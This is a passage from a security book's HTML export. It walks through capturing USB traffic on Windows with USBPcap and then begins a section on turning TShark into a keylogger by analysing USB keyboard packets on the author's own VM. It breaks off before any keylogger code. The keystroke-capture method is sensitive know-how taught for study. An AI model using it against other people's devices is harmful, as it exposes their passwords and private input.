<div class="Section290" ><p class=MsoBodyText ><img width="779"  height="643"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker372432.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark570" ></a><span><a href="#_bookmark569" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-12:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Capturing on usbmon2</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now you can go about performing analysis on the USB traffic, even saving the packets out to pcap for later analysis. Before we get into playing around with the USB traffic, let&#8217;s go over how to capture traffic in Windows.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Capturin<a name="_bookmark571" ></a>g USB Traffic on Windows</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Unlike Linux, Windows does not have a built-in functionality to sniff USB traffic. Capturing USB traffic on Windows requires third-party software. Recent releases of the Windows Wireshark installer come bundled with USBPcap, a third-party utility for sniffing USB traffic. You should already have this installed if you followed the Wireshark installation instructions for Windows. If not, you can always download</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section291" ><p class=MsoBodyText  style="margin-top:3.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the latest version of USBPcap from </span><span><a href="http://desowin.org/usbpcap/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >http://desowin.org/usbpcap/</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. USBPcap is a command-line tool, so you run it from the Windows command prompt. USBPcap needs administrator privileges, so make sure you select Run as Administrator when opening a command prompt to run USBPcap. After opening an Adminstrator command prompt, you will change directories to the USBPcap installation directory, which, by default, is located at </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >C:\Program Files\USBPcap</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The following sample output shows how to run and display the USBPcap help:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Microsoft Windows [Version 6.1.7601]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:22.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Copyright (c) 2009</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;letter-spacing:-1.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Microsoft</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;letter-spacing:-0.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Corporation.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >All rights</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;letter-spacing:-0.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >reserved. C:\WINDOWS\system32&#62;cd C:\Program</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;letter-spacing:-0.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Files\USBPcap</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >C:\Program Files\USBPcap&#62;USBPcapCMD.exe -h</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >C:\Program Files\USBPcap&#62;Usage: USBPcapCMD.exe [options]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:323.8000pt;margin-left:36.7500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-h, -?, --help Prints this help.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-d &#60;device&#62;, --device &#60;device&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >USBPcap control device to open. Example: -d \\.\USBPcap1.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:273.4000pt;margin-left:36.7500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-o &#60;file&#62;, --output &#60;file&#62; Output .pcap file name.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:280.6000pt;margin-left:36.7500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-s &#60;len&#62;, --snaplen &#60;len&#62; Sets snapshot length.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-b &#60;len&#62;, --bufferlen &#60;len&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Sets internal capture buffer length. Valid range</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#60;4096,134217728&#62;.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-A, --capture-from-all-devices</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Captures data from all devices connected to selected Root Hub.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--devices &#60;list&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Captures data only from devices with addresses present in list.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >List is comma separated list of values. Example --devices 1,2,3.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-I,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--init-non-standard-hwids</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Initializes NonStandardHWIDs registry key used by USBPcapDriver.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >This registry key is needed for USB 3.0 capture.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:11.6500pt;" ><a name="_bookmark572" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To get a list of available devices, run the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >USBPcapCMD.exe </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command without any arguments. This brings up another command prompt that</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section292" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:5.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >lists the available devices and asks which one you want to start capturing on.<a name="_bookmark573" ></a>&nbsp;</span><span><a href="#_bookmark574" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-13</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows the USBPcap window running on a Windows 7 VM. You can see there are two buses, with a mouse (VirtualBox virtual pointer) and a smart card device connected to bus 1 named </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >\\.\USBPcap1</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="779"  height="286"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker375134.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:9.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark574" ></a><span><a href="#_bookmark573" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-13:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >USBPcap device list</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:10.0000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Number 1, the USB bus, is selected as the filter control device to sniff on. After selecting which device to sniff from, USBPcap then asks for an output filename. <a name="_bookmark575" ></a>This file will be the output pcap. You are free to provide any name you want. As shown in<a name="_bookmark576" ></a>&nbsp;</span><span><a href="#_bookmark577" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-14</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, we provided the filename </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp_usb.pcap</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="782"  height="304"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker375539.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:7.6500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark577" ></a><span><a href="#_bookmark576" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-14:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >USBPcap running a capture</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Only after you press Enter does USBPcap start capturing USB traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section293" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Notice, however, that USBPcap doesn&#8217;t show any visual indication of what it is doing. </span><span><a href="#_bookmark577" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-14</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows USBPcap performing a packet capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Pressing Ctrl+C stops the capture, and the USBPcap window closes. The file is saved in the working directory of USBPcap, so we should now have a pcap file located at </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >C:\Program Files\USBPcap\w4sp_usb.pcap</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. When you open the file in Wireshark, you should be able to see USB traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >TShark Keylogger</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now that you know how to capture USB traffic from both Windows and Linux, let&#8217;s discuss how to use Lua to turn TShark into a keylogger. To start, we need to figure out what our key presses look like. To do this, we again connect a USB keyboard to our Kali VM and sniff in Wireshark to see what kinds of packets are sent on a key press. Not being an expert on the USB protocol, analysis might start by pressing just the keys ABC and examining the traffic as a result.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Pressing three keys resulted in 12 USB packets being generated. Perhaps that means that four packets are sent per key press. We know that the keyboard is going to be sending to the host, so that is going to be the information we are most interested in. We can therefore limit some of the packets we have to analyze by using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >usb.dst == "host" </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >display filter so that we see only packets from USB devices going to the USB host (see<a name="_bookmark578" ></a>&nbsp;</span><span><a href="#_bookmark579" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-15</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section294" ><p class=MsoBodyText ><img width="780"  height="483"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker377102.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark579" ></a><span><a href="#_bookmark578" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-15:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Filtering USB traffic to host</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:10.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you scroll through the packets now and look at the Leftover Capture Data, you can see that it contains either a few zeros and a single number or all zeros. If you look at the number, you may notice that it increases, starting at 4 and 